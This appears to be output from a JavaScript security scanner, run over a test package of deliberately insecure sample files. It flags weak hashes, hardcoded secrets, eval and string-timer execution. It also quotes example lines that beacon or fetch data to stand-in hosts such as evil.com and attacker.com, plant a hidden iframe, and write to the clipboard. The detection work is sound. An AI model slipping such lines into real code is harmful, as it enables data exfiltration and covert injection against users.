@@ -1,0 +1,123 @@
+
+===== FILE: C:\Users\vasud\Downloads\js_full_test_package\crypto_example.js =====
+
+=== Suspicious Functions ===
+No suspicious patterns detected.
+
+=== Crypto Issues ===
+[!] Weak Hash MD5 | Line 39 | Code: var hash = MD5("hello");
+[!] Hardcoded Secret | Line 37 | Code: var password = "admin123";
+
+=== Obfuscation Indicators ===
+No obfuscation patterns detected.
+
+=== DOM Manipulation Risks ===
+No DOM risks detected.
+
+=== Network Calls ===
+No suspicious network calls detected.
+===== FILE: C:\Users\vasud\Downloads\js_full_test_package\dom_example.js =====
+
+=== Suspicious Functions ===
+[!] document.write usage | Line 39 | Code: document.write("<iframe src='http://evil.com' style='display:none'></iframe>");
+
+=== Crypto Issues ===
+No crypto issues detected.
+
+=== Obfuscation Indicators ===
+No obfuscation patterns detected.
+
+=== DOM Manipulation Risks ===
+[!] document.cookie usage detected | Line 37 | Code: document.cookie = "session=123";
+[!] Hidden iframe detected | Line 39 | Code: document.write("<iframe src='http://evil.com' style='display:none'></iframe>");
+[!] Clipboard write detected | Line 38 | Code: navigator.clipboard.writeText("steal-data");
+
+=== Network Calls ===
+[!] Insecure HTTP request detected | Line 39 | Code: document.write("<iframe src='http://evil.com' style='display:none'></iframe>");
+===== FILE: C:\Users\vasud\Downloads\js_full_test_package\eval_example.js =====
+
+=== Suspicious Functions ===
+[!] Dangerous eval() usage | Line 38 | Code: eval(userInput);
+
+=== Crypto Issues ===
+No crypto issues detected.
+
+=== Obfuscation Indicators ===
+No obfuscation patterns detected.
+
+=== DOM Manipulation Risks ===
+No DOM risks detected.
+
+=== Network Calls ===
+No suspicious network calls detected.
+===== FILE: C:\Users\vasud\Downloads\js_full_test_package\mixed_example.js =====
+
+=== Suspicious Functions ===
+[!] Dangerous eval() usage | Line 39 | Code: eval("hidden");
+[!] setTimeout string execution | Line 42 | Code: setTimeout("alert('test')",1000);
+
+=== Crypto Issues ===
+[!] Weak Hash SHA1 | Line 44 | Code: var hash = SHA1("password");
+[!] Hardcoded Secret | Line 41 | Code: var key = "super_secret_key";
+
+=== Obfuscation Indicators ===
+No obfuscation patterns detected.
+
+=== DOM Manipulation Risks ===
+No DOM risks detected.
+
+=== Network Calls ===
+[!] Insecure HTTP request detected | Line 43 | Code: fetch("http://evil-server.com");
+===== FILE: C:\Users\vasud\Downloads\js_full_test_package\network_example.js =====
+
+=== Suspicious Functions ===
+No suspicious patterns detected.
+
+=== Crypto Issues ===
+No crypto issues detected.
+
+=== Obfuscation Indicators ===
+No obfuscation patterns detected.
+
+=== DOM Manipulation Risks ===
+No DOM risks detected.
+
+=== Network Calls ===
+[!] Insecure HTTP request detected | Line 37 | Code: fetch("http://evil.com/data");
+[!] Insecure HTTP request detected | Line 38 | Code: navigator.sendBeacon("http://attacker.com/log");
+[!] Beacon API usage detected | Line 38 | Code: navigator.sendBeacon("http://attacker.com/log");
+[!] WebSocket connection detected | Line 39 | Code: var ws = new WebSocket("ws://malicious.com");
+===== FILE: C:\Users\vasud\Downloads\js_full_test_package\obfuscation_example.js =====
+
+=== Suspicious Functions ===
+No suspicious patterns detected.
+
+=== Crypto Issues ===
+No crypto issues detected.
+
+=== Obfuscation Indicators ===
+[!] Hex encoded string detected
+[!] Suspicious long variable name (possible obfuscation)
+
+=== DOM Manipulation Risks ===
+No DOM risks detected.
+
+=== Network Calls ===
+No suspicious network calls detected.
+===== FILE: C:\Users\vasud\Downloads\js_full_test_package\timeout_example.js =====
+
+=== Suspicious Functions ===
+[!] setTimeout string execution | Line 37 | Code: setTimeout("alert('timeout attack')",1000);
+[!] setInterval string execution | Line 38 | Code: setInterval("console.log('interval')",2000);
+
+=== Crypto Issues ===
+No crypto issues detected.
+
+=== Obfuscation Indicators ===
+No obfuscation patterns detected.
+
+=== DOM Manipulation Risks ===
+No DOM risks detected.
+
+=== Network Calls ===
+No suspicious network calls detected.
